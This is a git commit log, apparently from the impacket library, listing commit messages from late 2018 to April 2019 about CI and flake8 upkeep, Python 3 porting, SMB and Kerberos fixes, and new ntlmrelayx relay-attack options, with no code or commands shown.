commit b1458ce76a6bd6155c3c69860d184ddecc3f3cc0
Author: Clément Notin <clement@notin.org>
Date:   Wed Apr 17 13:38:32 2019 +0200

    Add STYPE_MASK constant

commit cd58aedca42a05c4a5f90a25f333f04d03af6852
Author: cclauss <cclauss@me.com>
Date:   Sun Apr 7 17:06:07 2019 +0200

    Flake8: Raise all E9xx errors

commit f784e233265960dbeacf91a28d63d0614c2d8171
Author: cclauss <cclauss@me.com>
Date:   Sun Apr 7 16:14:21 2019 +0200

    Upgrade flake8 to 3.7.7

commit 754a421fd937402ae51921cc82c2004d0fd9962a
Author: cclauss <cclauss@me.com>
Date:   Sun Apr 7 16:13:25 2019 +0200

    remcomsvc.py: Remove backslash at end of the file
    
    flake8 says:
    ```
    ./impacket/examples/remcomsvc.py:1:1: E902 TokenError: EOF in multi-line statement
    ```

commit fef3bb983fed9d65d11b71ab40fbff709bb8853c
Author: cclauss <cclauss@me.com>
Date:   Sun Apr 7 15:44:19 2019 +0200

    flake8 . --max-complexity=65

commit 6d064d00974128054ded721847ebb56276c66f8d
Author: cclauss <cclauss@me.com>
Date:   Sun Apr 7 15:21:00 2019 +0200

    Update .travis.yml

commit ef0769230961609c5f58f3aabe0de56699d501ea
Author: cclauss <cclauss@me.com>
Date:   Sun Apr 7 15:20:43 2019 +0200

    Revert flake8 upgrade

commit 6bdecc02071b76cb08884ef67c131a0fbb2b2828
Author: cclauss <cclauss@me.com>
Date:   Sun Apr 7 15:14:15 2019 +0200

    tox.ini: Add py37

commit 3ccc22bbde4c2ca17b7201ff4c997cdf89f7779c
Author: cclauss <cclauss@me.com>
Date:   Sun Apr 7 15:12:28 2019 +0200

    Travis CI: Test on Python 3.7 and flake8 3.7

commit e715bac7b4c242418c0547fe22e64dd496017070
Author: Aconite33 <kazul33@gmail.com>
Date:   Sun Apr 7 13:36:40 2019 +0100

    Required command for options and removed allowing interactive shells.

commit 9057749df1a5405a99ca77a751abd588de67641b
Author: Aconite33 <kazul33@gmail.com>
Date:   Sun Apr 7 13:19:15 2019 +0100

    Added silent function to allow execution of commands without running cmd.exe

commit 194b22ed2fc85c4f241375fb7ebe4e0d89626c8c
Merge: 4905c8c0 29e4bbb0
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Fri Apr 5 23:52:19 2019 -0300

    Merge pull request #603 from skorov/master
    
    hLsarOpenPolicy2 was being reference (incorrectly) from lsat

commit 29e4bbb0735c758f307c442758578fb45e03e295
Author: skorov <alexei.doud@gmail.com>
Date:   Fri Apr 5 11:23:37 2019 +1100

    Fixed bug where hLsarOpenPolicy2 was being reference (incorrectly) from lsat

commit 4905c8c0ba9c5ff42de5709d8499627e97af1eea
Merge: 429f97a8 1114c3e1
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Apr 4 14:24:09 2019 -0300

    Merge pull request #601 from cclauss/patch-1
    
    Travis CI: Time to take off the training wheels...

commit 1114c3e1ac14cfc4b33e6b8f1cd470eb484a80bd
Author: cclauss <cclauss@me.com>
Date:   Thu Apr 4 18:07:56 2019 +0200

    Travis CI: Time to take off the training wheels...
    
    Should the __python36__ branch be removed as well to keep folks from stumbling into the wrong place?

commit 1f1baeabacc52d9d11e8e10626632ae3653391f5
Author: Clément Notin <clement@notin.org>
Date:   Wed Apr 3 16:22:04 2019 +0200

    smb3: fix the check to not encrypt anonymous connection

commit 429f97a894d35473d478cbacff5919739ae409b4
Merge: 7e18805c 8529e901
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Apr 1 15:18:33 2019 -0300

    Merge pull request #596 from SecureAuthCorp/python36
    
    Python36 Support

commit 8529e901e87525806e96b67476eed5d040b9b21b
Author: asolino <bethus@gmail.com>
Date:   Mon Apr 1 15:03:12 2019 -0300

    Chaging syntax for Python 3.x support

commit 7b04f191c02038599db55557c0faeed5f117592b
Merge: fcf8c53b 7e18805c
Author: asolino <bethus@gmail.com>
Date:   Mon Apr 1 14:53:58 2019 -0300

    Merge branch 'master' into python36

commit 7e18805cc468a542b3e219638d1da08dc3d18e5d
Author: asolino <bethus@gmail.com>
Date:   Mon Apr 1 14:52:24 2019 -0300

    Going back to dev version

commit 621fd66fa4adef112ec45cd0c96207f2a6667300
Author: asolino <bethus@gmail.com>
Date:   Mon Apr 1 12:29:42 2019 -0300

    Ready to tag a new release

commit ff6450fc88c879d1e2b580a99ec6ff6b7a8ea62b
Author: asolino <bethus@gmail.com>
Date:   Mon Apr 1 11:38:51 2019 -0300

    Return SMB2/3 signing information the same way SMB1 does.
    
    Fixes https://github.com/byt3bl33d3r/CrackMapExec/pull/300

commit 50ccbf9fb7b12cb31a260db321bd8e70ab408c50
Author: Zer1t0 <Zer1t0@mail.com>
Date:   Tue Mar 19 11:54:37 2019 +0100

    added usage

commit 723f634c15e9c7bfbb3d4d7489a0fdfa30a1b09b
Author: Zer1t0 <Zer1t0@mail.com>
Date:   Tue Mar 19 11:38:13 2019 +0100

    included into ccache save kirbi file

commit f531fd7b53cd793e0ab103fbcf0e7c169667a089
Author: Zer1t0 <Zer1t0@mail.com>
Date:   Tue Mar 19 11:24:00 2019 +0100

    included into ccache load from kirbi file

commit 5a17a2b6639a1e27d80bb21b97abf06a75deae5e
Author: Zer1t0 <Zer1t0@mail.com>
Date:   Tue Mar 19 10:53:13 2019 +0100

    added ccache to kirbi functionality

commit e4e29fb675dafe9aa25d2a619f955b0904b54a19
Author: Zer1t0 <Zer1t0@mail.com>
Date:   Mon Mar 18 07:59:29 2019 +0100

    added kirbi to ccache functionality

commit fcf8c53b887c36f948856cbcab213f2b23aa476e
Merge: c97c69f1 37cee525
Author: asolino <bethus@gmail.com>
Date:   Sat Mar 16 09:18:04 2019 -0300

    Merge branch 'master' into python36

commit 37cee525eb265c82032f8b5e17334a9c2d9f1700
Merge: a400ca15 9d2bfcb3
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Sat Mar 16 09:13:13 2019 -0300

    Merge pull request #590 from Zer1t0/mod_GetNPUsers
    
    added hashcat/john format and users file input to GetNPUsers.py

commit 9d2bfcb3d99532b7de7ef8b4327c8a0c19220555
Author: Zer1t0 <Zer1t0@mail.com>
Date:   Sat Mar 16 11:37:21 2019 +0100

    added usersfile option

commit 8651f50f416bb6f3398b652aad2ba7c0e6e9022f
Author: Zer1t0 <Zer1t0@mail.com>
Date:   Sat Mar 16 11:02:25 2019 +0100

    added john/hashcat format option

commit c97c69f1a55a34ce904a57cf7633be922c0dbf71
Merge: cafda7be a400ca15
Author: asolino <bethus@gmail.com>
Date:   Wed Mar 13 20:55:27 2019 -0300

    Merge branch 'master' into python36

commit a400ca15946c6c1f4d7a9dfc852032510b75816d
Merge: f254380c 2cf24ed6
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Mar 13 20:49:34 2019 -0300

    Merge pull request #584 from Fist0urs/krb5tgs_1718
    
    Fix incorrect checkum regarding aes-encrypted TGS tickets

commit cafda7be22d96d710007a6ae0aad400dd620410b
Merge: 680624b9 f254380c
Author: asolino <bethus@gmail.com>
Date:   Mon Mar 11 11:18:20 2019 -0300

    Merge branch 'master' into python36

commit f254380ca6ebd356ade0edf53d54fdf3bc1edc0c
Merge: ade9b6fb f2f5fadd
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Mar 11 09:50:46 2019 -0300

    Merge pull request #575 from Petraea/master
    
    Alter requirements for Windows

commit 2cf24ed6a006b2371e539a35e240c764b980e10c
Author: Fist0urs <jean-christophe.delaunay@synacktiv.com>
Date:   Sun Mar 10 12:59:12 2019 +0100

    Fix incorrect checksum within aes128-aes256 + format output for john/hashcat accordingly

commit ade9b6fb7c35deb6302765bd478925ffb6082c2f
Merge: 89165ef1 2c0ecaf2
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Sat Mar 9 22:11:30 2019 -0300

    Merge pull request #583 from SR4ven/issue-582
    
    Temporary fix for #582

commit 2c0ecaf2a31fdbc86e44e21a4167e83fb2f20d93
Author: SR4ven <46794237+SR4ven@users.noreply.github.com>
Date:   Sat Mar 9 19:40:03 2019 +0100

    Temporary fix for #582

commit 680624b9275f0344b79922602958567244c11071
Merge: 4668318e 89165ef1
Author: asolino <bethus@gmail.com>
Date:   Tue Mar 5 10:34:35 2019 -0300

    Merge branch 'master' into python36

commit 89165ef1c06be701c32826de173ceb57e101372a
Merge: 4fdbbcc4 64500b92
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Tue Mar 5 10:33:49 2019 -0300

    Merge pull request #579 from dirkjanm/rbdelrelay
    
    Add Resource Based Delegation features to ntlmrelayx

commit 64500b92a38ef0423af7c5c7ed90567b1eadb074
Author: Dirk-jan Mollema <dirkjan@dirkjanm.io>
Date:   Mon Mar 4 19:40:53 2019 +0100

    py3 compatibility

commit 381ee348dbc531857a0e1c186db88930056c184d
Author: Dirk-jan Mollema <dirkjan@dirkjanm.io>
Date:   Mon Mar 4 19:25:20 2019 +0100

    RB Delegation abuse for ntlmrelayx LDAP attack

commit 4668318e3da3e66a77332e6944099e6d915d3f77
Merge: b2455441 4fdbbcc4
Author: asolino <bethus@gmail.com>
Date:   Wed Feb 27 14:41:23 2019 -0300

    Merge branch 'master' into python36

commit 4fdbbcc4a9e0bdf49a82d72dd7d220ac8c8574a8
Author: asolino <bethus@gmail.com>
Date:   Wed Feb 27 14:10:25 2019 -0300

    Avoid crashing if NT Hash cannot be retrieved for an specific row

commit b2455441fc3749d0b0080679d0636443327d2957
Merge: d9b46251 247ded77
Author: asolino <bethus@gmail.com>
Date:   Mon Feb 11 09:58:36 2019 -0300

    Merge branch 'master' into python36

commit 247ded77946fd74c8ac2393798564d9f547ee4cf
Merge: 82a8a97b 3a4acd34
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Feb 11 09:55:56 2019 -0300

    Merge pull request #576 from fox-it/ldapattack-improve
    
    ntlmrelayx ldapattack improvements

commit 3a4acd341f9a3374065b8d97e3ec23df39dc7cff
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Sun Feb 10 13:34:20 2019 +0100

    Added ACL restore options to ntlmrelayx ldap attack

commit f4f1c27a83821c5cefd71b1980c855e3dbae030d
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Fri Feb 8 12:50:09 2019 +0100

    Fixed security descriptor parsing in ntlmrelayx ldap attack

commit f2f5faddc7c6c7c63d043f52994d31764e95796f
Author: Petraea <Petraea@users.noreply.github.com>
Date:   Fri Feb 8 12:45:17 2019 +0100

    Alter requirements for Windows

commit d9b462513745b08fdb63e025dc103e4fac6c0829
Merge: f284e9db 82a8a97b
Author: asolino <bethus@gmail.com>
Date:   Wed Feb 6 19:30:49 2019 -0300

    Merge branch 'master' into python36

commit 82a8a97b170c2f75a7efaab232780b6abc27302a
Author: asolino <bethus@gmail.com>
Date:   Wed Feb 6 19:30:31 2019 -0300

    Updating

commit 0a56ff11f1c88dea1ca2819e45237cf6eddfbc1c
Merge: 812972ee 02127479
Author: asolino <bethus@gmail.com>
Date:   Thu Jan 31 10:56:22 2019 -0300

    Merge branch 'muizzk-master'

commit 02127479fc06b3bb2c86d4b1a8ca5d15f9ee6bb1
Author: asolino <bethus@gmail.com>
Date:   Thu Jan 31 10:55:31 2019 -0300

    Moving flake8 install to travis so we don't impacket users to install it (not necessary)

commit 5c379390e94380fde2fd18134a1eb283e4d2f632
Author: Muizudeen Kusimo <muizudeen@travis-ci.org>
Date:   Wed Jan 30 15:51:19 2019 -0800

    Pin flake8 version & remove from travis config

commit f284e9dba960b05703d283768cec99a867d17c3e
Merge: a63e784a 812972ee
Author: asolino <bethus@gmail.com>
Date:   Wed Jan 30 18:30:37 2019 -0300

    Merge branch 'master' into python36

commit 812972eef48160bf2c38e4e4e59877b9779f3f5a
Merge: b64f8e35 2e918baa
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Jan 30 18:26:31 2019 -0300

    Merge pull request #568 from martingalloar/ldapattack-validateprivs
    
    ntlmrelayx: added option to avoid privileges enumeration on LDAP attack

commit b64f8e35dd3f02c83804dec97cdd5a13816e49e5
Author: asolino <bethus@gmail.com>
Date:   Wed Jan 30 18:19:06 2019 -0300

    We're now in 2019 :)

commit 2e918baa63cf8524b134def24687c6cc251ac5e7
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Wed Jan 30 17:24:38 2019 -0300

    Added log note

commit 7cf76787b7b8d22157355485715fe7235442fd75
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Wed Jan 30 17:12:41 2019 -0300

    ntlmrelayx: added option to avoid privileges enumeration
    
    As this might be noise and slow on certain Domains, it might be handy to have an option to explicitely avoid validating user's privileges and assume the user have it. Note that this only leaves escalating to a user via ACL attacks, as the other methods requires determining the proper containers.

commit a63e784ac0381927c004307be2861a34f627bd33
Merge: b96bedc8 cef2cb8f
Author: asolino <bethus@gmail.com>
Date:   Sun Jan 27 12:58:44 2019 -0300

    Merge branch 'master' into python36

commit cef2cb8fc0ba1b826f8b50a2ed14b6827834070f
Merge: 66cdd998 328c2d1f
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Sun Jan 27 07:58:19 2019 -0800

    Merge pull request #564 from fox-it/krbfixes
    
    Small fixes

commit 328c2d1f3981acc9ac069589d1d8ed1d3a6f04b5
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Sat Jan 26 14:11:13 2019 +0100

    fix wrong security descriptor flag constant

commit 0404dc6808972e11e47bf9c18aabc11ec48013dc
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Sat Jan 26 14:00:34 2019 +0100

    use custom KDC in S4U

commit 66cdd998549b49644b00dcb2806d2cdcde128285
Author: asolino <bethus@gmail.com>
Date:   Sat Jan 26 02:49:50 2019 -0300

    Chaning order when filling out the activeRelays list
    
    * Just to avoid some concurrency problems

commit b96bedc8bd13d36554edd27cfee42a3be084cfb2
Merge: 3c6f1d3b 82729d3a
Author: asolino <bethus@gmail.com>
Date:   Sat Jan 26 01:32:28 2019 -0300

    Merge branch 'master' into python36

commit 82729d3ab046846380ef2589cc675791f46e18f2
Author: asolino <bethus@gmail.com>
Date:   Sat Jan 26 01:29:33 2019 -0300

    Getting rid of SMBRelay connectionData dict.
    
    * In theory we can get by with the connId (the thread number) connection data.
    * If theory fails this might break things badly, testing needed.

commit 6648b4002a632b5e87dfaf6071bd4883774afa96
Author: asolino <bethus@gmail.com>
Date:   Fri Jan 25 19:40:17 2019 -0800

    We're now logging the target and also the username
    
    * Regardless of it being soecified as a target.

commit 211e9c89aff0560a076278eaf5ea0309598974cd
Author: asolino <bethus@gmail.com>
Date:   Fri Jan 25 19:02:15 2019 -0800

    If relay was successful we should tell the TargetProcessor that.
    
    * And add the target to the finishedAttacks if applicable

commit 3c6f1d3b4b30f9de605a677433ae3367cd88c449
Merge: 67575cd0 e657345c
Author: asolino <bethus@gmail.com>
Date:   Thu Jan 24 14:49:39 2019 -0800

    Merge branch 'master' into python36

commit e657345c3390921d24cbebd11b4c89b3499189ad
Merge: bbce4d32 ecc05af6
Author: asolino <bethus@gmail.com>
Date:   Thu Jan 24 14:46:02 2019 -0800

    Merge branch 'eladshamir-patch-1'

commit ecc05af6632e02236780198685a099a0b9b78352
Author: asolino <bethus@gmail.com>
Date:   Thu Jan 24 14:44:50 2019 -0800

    Adding structure and constants for resource-based constrained delegation
    
    * So we can replace the raw binary data

commit 67575cd020691c91f10e4c45f4d98de11c6649b3
Merge: 8a511a2a bbce4d32
Author: asolino <bethus@gmail.com>
Date:   Thu Jan 24 13:30:00 2019 -0800

    Merge branch 'master' into python36

commit bbce4d3200e63772fce87274c17097db9f5de157
Merge: 0e33a702 800ee48c
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Jan 24 13:29:33 2019 -0800

    Merge pull request #562 from Zer1t0/relayservers_ports
    
    Relayservers ports

commit 800ee48cde555447bebdd454ed83c5c9de36a6b9
Author: Zer1t0 <Zer1t0@test.virtual>
Date:   Thu Jan 24 17:00:07 2019 +0100

    added option to listening in custom port

commit 09b1a866cb7ace3a5d1b92f90e3a39e76e9ffedf
Author: root <root@debmin.test.virtual>
Date:   Thu Jan 24 16:25:35 2019 +0100

    added parameter to not launch SMB or HTTP server

commit bb17d8450eaa8a6ebaedc7f67e6a4d1f97d588c7
Author: Elad Shamir <8843083+eladshamir@users.noreply.github.com>
Date:   Sat Jan 19 03:22:39 2019 +1100

    Adding resource-based constrained delegation support to S4U

commit 8a511a2ac0fe5769b15f5cc65d292e9e34e43d8c
Merge: 104b3e28 0e33a702
Author: asolino <bethus@gmail.com>
Date:   Wed Jan 16 10:18:45 2019 -0300

    Merge branch 'master' into python36

commit 0e33a702165aa35d035503830fc302343eee020a
Merge: be27ab94 94eaf5fc
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Jan 16 10:18:00 2019 -0300

    Merge pull request #556 from franferrax/master
    
    Minor change in secretsdump.py: New LSA_KERBEROS secret type for __perSecretCallback()

commit be27ab948f71d34378d51dc3fcbd3ca16bdc39a1
Merge: 2b708a9a f859ceb3
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Jan 16 10:13:13 2019 -0300

    Merge pull request #557 from CaledoniaProject/master
    
    Use ^D to exit shell

commit f859ceb3d8356b8e7a13af2f6a2056d31c497a49
Author: Aaron Lewis <the.warl0ck.1989@gmail.com>
Date:   Wed Jan 16 19:22:45 2019 +0800

    Use ^D to exit shell

commit 94eaf5fc1fb3ae1dc2458d6a50a62a155f55fe27
Author: fferrari <fferrari@coresecurity.com>
Date:   Tue Jan 15 18:04:39 2019 -0300

    New LSA_KERBEROS secret type for __perSecretCallback()
    With #512 implementation, Kerberos keys are now dumped along with the LSA secrets, so we added the new LSASecrets.SECRET_TYPE.LSA_KERBEROS to notify the secret's type while executing the configured secrets callback (analogous to NTDSHashes.SECRET_TYPE.NTDS_KERBEROS)

commit 104b3e287d974177c550529d6e6fdd3adc896ca9
Merge: 11a6921d 2b708a9a
Author: asolino <bethus@gmail.com>
Date:   Mon Jan 14 10:02:29 2019 -0300

    Merge branch 'master' into python36

commit 2b708a9ae222c49163b846290ea5e8af07342f02
Author: asolino <bethus@gmail.com>
Date:   Mon Jan 14 10:01:44 2019 -0300

    Handling Ctrl-D to exit MiniShell.
    
    - Fixes https://github.com/SecureAuthCorp/impacket/issues/555

commit 11a6921da8b6a4cba7af33929f9660efee7ab2f5
Merge: 906a8cc5 11f4e014
Author: asolino <bethus@gmail.com>
Date:   Fri Jan 11 15:53:13 2019 -0300

    Merge branch 'master' into python36

commit 11f4e014d60745b875eba2a091a29e90409c3971
Author: asolino <bethus@gmail.com>
Date:   Fri Jan 11 15:49:52 2019 -0300

    Adding isAdmin() to ProtocolClient plugin
    
    Should return whether or not the user is admin in the form of a string (e.g. "TRUE", "FALSE")
    Depending on the protocol, different techniques should be used.
    By default, raise exception
    
    For now, only implemented for the SMBRelayClient (should be easy to do for MSSQL).
    
    Improvements over what was committed in https://github.com/SecureAuthCorp/impacket/pull/548 since it now also covers connections comming from the HTTP Server (besides now belonging to the plugins).
    
    Testing needed

commit 906a8cc59f9cb2548b2357fd4ce1df61bf51b1cf
Author: asolino <bethus@gmail.com>
Date:   Tue Jan 8 19:29:45 2019 -0300

    Making https://github.com/SecureAuthCorp/impacket/pull/552 Python3 friendly

commit 306348dd6307c9c7db79655a737f15084875ccf4
Merge: 775acb7b 196fabc7
Author: asolino <bethus@gmail.com>
Date:   Tue Jan 8 19:21:42 2019 -0300

    Merge branch 'master' into python36

commit 196fabc766ffdb20e06a23e0c2092492801b879f
Merge: 8f19671d 45a13e5f
Author: asolino <bethus@gmail.com>
Date:   Tue Jan 8 19:19:14 2019 -0300

    Merge branch 'Qwokka-master'

commit 45a13e5ff39febcefeefb70c323756a844bfe7e5
Author: asolino <bethus@gmail.com>
Date:   Tue Jan 8 19:18:06 2019 -0300

    Adding support for relative and non-relative paths
    
    - For https://github.com/SecureAuthCorp/impacket/pull/552

commit c7cce5a1b0fb0ee6f74324d352218ba9791e4fcd
Author: asolino <bethus@gmail.com>
Date:   Tue Jan 8 19:16:22 2019 -0300

    We gracefully fail if we're under SMB1
    
    - For https://github.com/SecureAuthCorp/impacket/pull/552

commit 91e712ad040f285edd28579fe934be0057ca86a8
Merge: 8f19671d 33b095c8
Author: asolino <bethus@gmail.com>
Date:   Mon Jan 7 21:36:11 2019 -0300

    Merge branch 'master' of https://github.com/Qwokka/impacket into Qwokka-master

commit 775acb7be5baa4e59dfc33e229c69b9cd14b4753
Merge: c3a779d7 8f19671d
Author: asolino <bethus@gmail.com>
Date:   Mon Jan 7 21:02:48 2019 -0300

    Merge branch 'master' into python36

commit 8f19671d74e454ec34a392b95d23b9204d42c436
Author: asolino <bethus@gmail.com>
Date:   Mon Jan 7 21:00:48 2019 -0300

    Only check for remote admin privilege when target protocol is SMB
    
    - Bug added when merging https://github.com/SecureAuthCorp/impacket/pull/548
    - Interesting ToDo written there to make this in a much better/modular way (PRs welcomed)

commit 33b095c80385bb33673313b33f42125596598aa3
Author: Jack Baker <jackchrisbaker@gmail.com>
Date:   Mon Jan 7 13:29:43 2019 -0800

    Add "mount" and "umount" commands to add/remove mount points

commit 68eb9a63f84eb3b5c3ef2213ed1bf8575ba6b98b
Author: Jack Baker <jackchrisbaker@gmail.com>
Date:   Mon Jan 7 13:29:12 2019 -0800

    Add reparse point structures

commit fd8c434dcc84e31984b73ffa35f3e33ef9a95ba2
Author: Jack Baker <jackchrisbaker@gmail.com>
Date:   Mon Jan 7 13:28:45 2019 -0800

    Add createMountPoint and removeMountPoint functions

commit c3a779d7c3a38398a7ba3c4d32052e3526768d62
Merge: 86a4556e 899e1545
Author: asolino <bethus@gmail.com>
Date:   Mon Jan 7 17:41:57 2019 -0300

    Merge branch 'master' into python36

commit 899e15453d7f46df65eb285339212bb742103457
Merge: e49e558d e18eb49a
Author: asolino <bethus@gmail.com>
Date:   Mon Jan 7 17:40:20 2019 -0300

    Merge branch 'imaibou-socks_local_admin_check'

commit e18eb49a45ef6fada710d437352df68b904f44cb
Merge: e49e558d 50926cca
Author: asolino <bethus@gmail.com>
Date:   Mon Jan 7 17:37:42 2019 -0300

    Merge branch 'socks_local_admin_check' of https://github.com/imaibou/impacket into imaibou-socks_local_admin_check

commit e49e558de3a4a91bf02843e5ae4a0e13c0333106
Author: asolino <bethus@gmail.com>
Date:   Mon Jan 7 17:36:05 2019 -0300

    Be sure we're not using UNICODE during session setup relay
    
    - Bug manifested in ntlmrelayx after commit https://github.com/SecureAuthCorp/impacket/commit/b3e202869150c6562a2454d4f1707553bfd2f3d6

commit 86a4556ed9bcb7ed40da2e70338137c9a41153e8
Author: asolino <bethus@gmail.com>
Date:   Mon Jan 7 16:53:01 2019 -0300

    Python versions supported and minimal changes to README

commit c32c43cf83476869e34676ad026228da546a3896
Merge: edc890d0 8e3864bd
Author: asolino <bethus@gmail.com>
Date:   Mon Jan 7 13:06:00 2019 -0300

    Merge branch 'master' into python36

commit 8e3864bdb69b25f7b5d318aecc6dd71a47cacb84
Merge: 8c2ab38a 1afad92a
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Jan 7 13:03:38 2019 -0300

    Merge pull request #549 from MrAnde7son/patch-9
    
    Added IDL_DRSUnbind

commit edc890d054120bf0c4925877e6ffcf2601173e68
Author: asolino <bethus@gmail.com>
Date:   Mon Jan 7 12:47:07 2019 -0300

    Fixing a merge error
    
    - Forgot to import NTLMSSP_NEGOTIATE_SIGN

commit 603dd98b1f181b0fc318a7690721a095bbd5f964
Merge: 0b620ff4 8c2ab38a
Author: asolino <bethus@gmail.com>
Date:   Mon Jan 7 12:41:42 2019 -0300

    Merge branch 'master' into python36

commit 8c2ab38afbdbba90785de53d6c22bfeb6615260b
Author: asolino <bethus@gmail.com>
Date:   Mon Jan 7 12:38:10 2019 -0300

    When adding a share internally, always convert to upper case
    
    - Might address a side effect reported under https://github.com/SecureAuthCorp/impacket/issues/545

commit 1afad92a6c8bed001c0e270ed7157f57bc7afe40
Author: Itamar <mizrahi.itamar@gmail.com>
Date:   Wed Dec 26 15:11:52 2018 +0200

    Update drsuapi.py

commit c3176c5cca2612e8b32c6f9aa411ed1e09c8d2ca
Author: Itamar <mizrahi.itamar@gmail.com>
Date:   Wed Dec 26 15:10:03 2018 +0200

    Added IDL_DRSUnbind
    
    Hi,
    
    I added IDL_DRSUnbind method to destroy a context handle previously created by the IDL_DRSBind method.
    
    Thanks.

commit 0b620ff43c6e58112f7dc85f88b399de5801a293
Merge: 1e0214cd 16c56213
Author: asolino <bethus@gmail.com>
Date:   Fri Dec 21 19:06:16 2018 -0300

    Merge branch 'master' into python36

commit 16c562138dac02b1bb76a9e18938fa3ca5c3f290
Merge: b3e20286 5f5d3ea2
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Fri Dec 21 19:05:18 2018 -0300

    Merge pull request #547 from fox-it/signingwarning
    
    Made ldap->smb relaying incompatibility more clear in ntlmrelayx

commit 50926ccab63b050bdf97e1f5a25c982515face29
Author: ibo <imed.bounab@provadys.com>
Date:   Fri Dec 21 15:25:59 2018 +0100

    Adding check for local admin access for SMB relayed socks

commit c658e51cb6ab34b5e6f0bf4251845133e9940954
Author: ibo <imed.bounab@provadys.com>
Date:   Fri Dec 21 15:22:36 2018 +0100

    Revert "added GetInterestingFiles.py example script"
    
    This reverts commit febc5dae85009a0f113a9cbf0e9ebbcdcee3e322.

commit 6ff75c51252e55eaf575707920e500a3e254498c
Author: ibo <imed.bounab@provadys.com>
Date:   Fri Dec 21 15:17:16 2018 +0100

    Revert "Adding check for local admin access for SMB relayed socks"
    
    This reverts commit 19c180c7e44b428c1326523c533ff2d4901a9839.

commit 19c180c7e44b428c1326523c533ff2d4901a9839
Author: ibo <imed.bounab@provadys.com>
Date:   Fri Dec 21 15:09:23 2018 +0100

    Adding check for local admin access for SMB relayed socks

commit 5f5d3ea25509e96e51c6afb12fbf3bcc7335b1df
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Fri Dec 21 12:27:41 2018 +0100

    Made ldap->smb relaying incompatibility more clear in ntlmrelayx

commit 1e0214cd868270082f4a613a157edf3116437c13
Author: asolino <bethus@gmail.com>
Date:   Wed Dec 19 12:03:44 2018 -0300

    Decoding 'latin-1' instead of 'ascii' in case there are chars > 128
    
    - Should fix https://github.com/SecureAuthCorp/impacket/issues/535

commit dff713dbccdb4d88fd7e55692284a68a6b118750
Author: asolino <bethus@gmail.com>
Date:   Mon Dec 17 12:31:29 2018 -0300

    checking DEBUG level at the logging.getLogger() instance
    
    - Trying to nail down https://github.com/SecureAuthCorp/impacket/issues/535

commit 9a77aa52312378bd8dc67bc51319164ec4202428
Author: asolino <bethus@gmail.com>
Date:   Sun Dec 16 19:29:37 2018 -0300

    Adding more debug data when UnicodeDecodeError is triggered
    
    - Might help understanding https://github.com/SecureAuthCorp/impacket/issues/535

commit ae271633e4527f59a236feccfff43c08a8a676e3
Merge: 76af6c97 b3e20286
Author: asolino <bethus@gmail.com>
Date:   Sat Dec 15 10:56:11 2018 -0300

    Merge branch 'master' into python36

commit b3e202869150c6562a2454d4f1707553bfd2f3d6
Author: asolino <bethus@gmail.com>
Date:   Sat Dec 15 10:53:17 2018 -0300

    If target supports Unicode, we will talk Unicode

commit 76af6c972b67c88012f722e079d3ed0e1200f2cc
Merge: 09744feb 6726b312
Author: asolino <bethus@gmail.com>
Date:   Sat Dec 15 10:32:36 2018 -0300

    Merge branch 'master' into python36

commit 6726b312b116fbe71c927c698f13c86530af14ab
Author: asolino <bethus@gmail.com>
Date:   Sat Dec 15 10:32:11 2018 -0300

    Should bitwise AND to verify the flag is present

commit 09744feb6fdb52a55cf2b4b858330f0e24491205
Author: asolino <bethus@gmail.com>
Date:   Sat Dec 15 10:14:13 2018 -0300

    We either decode utf-16le or ascii, returning a str

commit 8e8485424d691b94a6c055239ac5c3e45bf92234
Merge: 9c7780b3 f99aaf93
Author: asolino <bethus@gmail.com>
Date:   Fri Dec 14 22:54:59 2018 -0300

    Merge branch 'master' into python36

commit f99aaf93d02b9da5f1219e083f82f4c722b0ace7
Author: asolino <bethus@gmail.com>
Date:   Fri Dec 14 22:52:02 2018 -0300

    Sending received packet flags to findFirst2 and queryFsInformation
    
    - A better way to determine how to encode the answers
    - Not sure if this addresses https://github.com/SecureAuthCorp/impacket/issues/545

commit 9c7780b31b1dff5a904d6ec96037c63c97257e72
Author: asolino <bethus@gmail.com>
Date:   Fri Dec 14 22:37:04 2018 -0300

    Catching TypeError as well

commit b1d959c41eae944a8aa3628e63ed2f7e1ef5abfa
Merge: b2f5337b 64caff11
Author: asolino <bethus@gmail.com>
Date:   Tue Dec 11 14:03:49 2018 -0300

    Merge branch 'master' into python36

commit 64caff119c85031349bb14b1ea397b14e06efb03
Merge: 0c67b6e9 397e0afe
Author: asolino <bethus@gmail.com>
Date:   Tue Dec 11 14:02:37 2018 -0300

    Merge branch 'MrAnde7son-patch-8'

commit 397e0afe8aaa92b21d28947300a69bd3055d035b
Author: asolino <bethus@gmail.com>
Date:   Tue Dec 11 14:01:42 2018 -0300

    Updated test cases for even.py
    
    - It does require package six, not a requirement currently in master (it will be soon onece we merge the Python36 branch)

commit 5d7434cb48ffa622f26c7a05889073b421feeda2
Author: Itamar <mizrahi.itamar@gmail.com>
Date:   Tue Dec 11 17:05:41 2018 +0200

    Update even.py

commit ee0e1aa9a871a76ec504b3e47833070387017709
Author: Itamar <mizrahi.itamar@gmail.com>
Date:   Mon Dec 10 16:40:47 2018 +0200

    Added MS-EVEN interface Implementation
    
    Hi mate,
